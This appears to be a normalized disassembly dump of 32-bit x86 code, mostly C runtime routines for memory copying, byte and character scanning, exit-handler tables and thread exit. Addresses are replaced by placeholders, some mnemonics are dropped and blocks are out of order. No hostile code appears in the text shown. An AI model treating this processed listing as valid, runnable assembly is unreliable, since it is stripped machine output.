jl r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_100463f0
mov esi eax
add esp 0x4
test esi esi
je r-xdata
cmp eax edi
je r-xdata
xor ecx ecx
xor eax eax
cmp edi 0x10ffff
jle r-xdata
cmp edi 0xdfff
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
pop edi
mov [ edx ] eax
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
push esi
push ebx
call sub_1002b630
mov eax edi
cdq
add esp 0x8
mov [ esi ] 0x5
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] edx
push edi
call sub_10013380
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_100463f0
mov esi eax
add esp 0x4
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
push edi
push 0x5
push ebx
call sub_1007e850
add esp 0xc
mov [ ebp - 0x8 ] 0x0
cmp edi 0xb
jne r-xdata
mov edx [ ebp + 0xc ]
pop edi
mov [ edx ] 0xfffd
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
push esi
push ebx
call sub_1002b630
mov eax edi
cdq
add esp 0x8
mov [ esi ] 0x5
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] edx
mov eax [ ebp + 0xc ]
mov [ eax ] edi
mov eax [ ebp - 0x8 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_1007ead0
push esi
push edi
xor edi edi
xor eax eax
jmp r-xdata
mov ecx [ eax + r--data ]
lea esi [ eax + r--data ]
mov eax [ esi + 0x4 ]
push 0x1
push eax
push ecx
push ebx
call sub_10041b90
add esp 0x10
test eax eax
jne r-xdata
pop edi
mov eax esi
pop esi
retn
inc edi
mov eax edi
shl eax 0x4
cmp [ eax + r--data ] 0xffffffff
jne r-xdata
pop edi
xor eax eax
pop esi
retn
sub_1007eb20
push ebp
mov ebp esp
push ecx
push esi
push ebx
call sub_1003fa70
mov esi eax
mov [ ebp - 0x4 ] esi
cmp eax 0x41
jl r-xdata
cmp eax 0x7a
jle r-xdata
lea ecx [ eax - 0x30 ]
cmp ecx 0x9
ja r-xdata
cmp eax 0x5a
jle r-xdata
push ebx
call sub_100428b0
jmp r-xdata
cmp eax 0x3b
jne r-xdata
push ebx
call sub_100194e0
add esp 0x8
cmp eax 0x61
jl r-xdata
mov eax 0x1
pop esi
mov esp ebp
pop ebp
retn
push edi
push ebx
call sub_1003fa70
mov edx [ ebp + 0x8 ]
mov edi eax
push edx
sub edi esi
call sub_100463f0
mov esi eax
add esp 0x8
test esi esi
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
push esi
push ebx
call sub_1002b630
mov eax [ ebp - 0x4 ]
add esp 0x8
mov [ esi ] 0x7
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] edi
sub_1007ebb0
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov ebx edi
call sub_1007ead0
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_1007eb20
push edi
mov esi eax
call sub_10042e70
add esp 0x8
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
cmp [ eax + ecx - 0x1 ] 0x3b
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0x10 ]
mov [ eax ] edx
mov ecx [ esi + 0xc ]
pop esi
mov [ eax + 0x4 ] ecx
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
push ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
call sub_100463f0
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
push edi
call sub_100194e0
add esp 0x4
cmp eax 0x3d
je r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x10 ]
mov [ eax ] ecx
mov edx [ esi + 0xc ]
pop esi
mov [ eax + 0x4 ] edx
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push ebx
push edi
call sub_1002b630
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
add esp 0x8
mov [ ebx ] 0x6
mov [ ebx + 0x18 ] edx
mov [ ebx + 0x1c ] eax
push edi
call sub_10042e70
add esp 0x4
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push eax
call sub_1006d857
add esp 0x4
test eax eax
je r-xdata
sub_1007ec90
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_1007ed14 ]
jmp [ ecx * 4 + jump_table_1007ed94 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1007ee00 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_1007ef9c ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_1007eea0 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1007ef9c ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1007ee00 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1007ef9c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1007ee00 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1007ee00 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1007ee00 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1007ef9c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1007ef9c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1007ef9c ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_1007eff1
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] ebx
call esi
mov esi eax
cmp esi ebx
jb r-xdata
xor eax eax
mov edi esi
sub edi ebx
lea eax [ edi + 0x4 ]
cmp eax 0x4
jb r-xdata
push ebx
call sub_100695d3
mov ebx eax
lea eax [ edi + 0x4 ]
pop ecx
cmp ebx eax
jae r-xdata
push [ ebp + 0x8 ]
mov edi [ EncodePointer@IAT ]
call edi
mov [ esi ] eax
add esi 0x4
push esi
call edi
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax ebx
cmp eax ebx
jb r-xdata
mov eax ebx
lea eax [ ebx + 0x10 ]
cmp eax ebx
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_100725a4
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_100725a4
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea esi [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_1007f0e8
mov edi edi
push ebp
mov ebp esp
push esi
call sub_10013143
call sub_100353d7
push eax
call sub_1005446c
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x54 ]
mov [ eax + 0x54 ] edx
mov edx [ ecx + 0x58 ]
mov [ eax + 0x58 ] edx
mov edx [ ecx + 0x4 ]
push ecx
mov [ eax + 0x4 ] edx
call sub_100164fc
mov esi [ ebp + 0x8 ]
push esi
call sub_100353d7
push eax
call sub_1001e658
test eax eax
jne r-xdata
call [ GetCurrentThreadId@IAT ]
mov [ esi ] eax
jmp r-xdata
call [ GetLastError@IAT ]
push eax
call [ ExitThread@IAT ]
call sub_1007f0a7
sub_1007f14d
push 0x20
push r--data
call sub_1007fb20
push 0x8
call sub_10058c10
pop ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1007f278
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_1007fb65
retn
mov [ rw-data ] 0x1
push 0x8
call sub_1001821c
pop ecx
push [ ebp + 0x8 ]
call sub_10069aed
mov [ ebp - 0x20 ] r--data
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x30 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] r--data
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] edi
add [ ebp - 0x20 ] 0x4
jmp r-xdata
call eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call sub_10053997
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x20 ] r--data
jae r-xdata
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
sub edi 0x4
mov [ ebp - 0x2c ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
push [ edi ]
call esi
mov ebx eax
call sub_10053997
mov [ edi ] eax
call ebx
push [ rw-data ]
call esi
mov ebx eax
push [ rw-data ]
call esi
cmp [ ebp - 0x24 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
mov edi eax
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x28 ] eax
je r-xdata
mov ebx [ ebp - 0x30 ]
jmp r-xdata
sub_1007f2a0
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_1007f360
mov eax [ esp + 0xc ]
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov edx [ esp + 0x8 ]
xor ebx ebx
mov bl [ esp + 0xc ]
test edx 0x3
je r-xdata
sub eax 0x4
jb r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
add eax 0x4
je r-xdata
push edi
mov edi ebx
shl ebx 0x8
add ebx edi
mov edi ebx
shl ebx 0x10
add ebx edi
jmp r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
sub eax 0x1
je r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
mov ecx [ edx ]
xor ecx ebx
mov edi 0x7efefeff
add edi ecx
xor ecx 0xffffffff
xor ecx edi
add edx 0x4
and ecx 0x81010100
je r-xdata
test edx 0x3
jne r-xdata
sub eax 0x1
jne r-xdata
sub eax 0x4
jb r-xdata
mov ecx [ edx - 0x4 ]
xor cl bl
je r-xdata
pop edi
lea eax [ edx - 0x4 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
lea eax [ edx - 0x3 ]
pop edi
pop ebx
retn
shr ecx 0x10
xor cl bl
je r-xdata
lea eax [ edx - 0x2 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
pop edi
jmp r-xdata
sub_1007f40d
push 0xc
push r--data
call sub_1007fb20
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ebp - 0x1c ] eax
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi eax
je r-xdata
cmp [ rw-data ] edx
je r-xdata
mov eax [ r--data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
xor eax eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
push edi
push esi
push ebx
call sub_1000c3a0
mov [ ebp - 0x1c ] eax
cmp esi 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
push edi
push esi
push ebx
call sub_10008fd9
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
push edi
push esi
push ebx
call sub_10008fd9
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
push edi
push eax
push ebx
call sub_1000c3a0
push edi
push 0x0
push ebx
call sub_10008fd9
mov eax [ r--data ]
test eax eax
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
and [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push edi
push 0x0
push ebx
call eax
mov eax [ r--data ]
test eax eax
je r-xdata
call sub_1007fb65
retn
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
sub_1007f503
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x20 ] 0x0
push edi
push 0x7
pop ecx
xor eax eax
lea edi [ ebp - 0x1c ]
[ edi ]
pop edi
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
or eax 0xffffffff
leave
retn
push esi
call sub_1007fa90
pop ecx
mov ecx 0x7fffffff
mov [ ebp - 0x14 ] 0x49
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] ecx
cmp eax ecx
ja r-xdata
push [ ebp + 0x14 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
leave
retn
mov [ ebp - 0x1c ] eax
sub_1007f580
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_1007f5d0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_1007f654 ]
jmp [ ecx * 4 + jump_table_1007f6d4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1007f740 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_1007f8dc ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_1007f7e0 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1007f8dc ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1007f740 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1007f8dc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1007f740 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1007f740 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1007f740 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1007f8dc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1007f8dc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1007f8dc ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
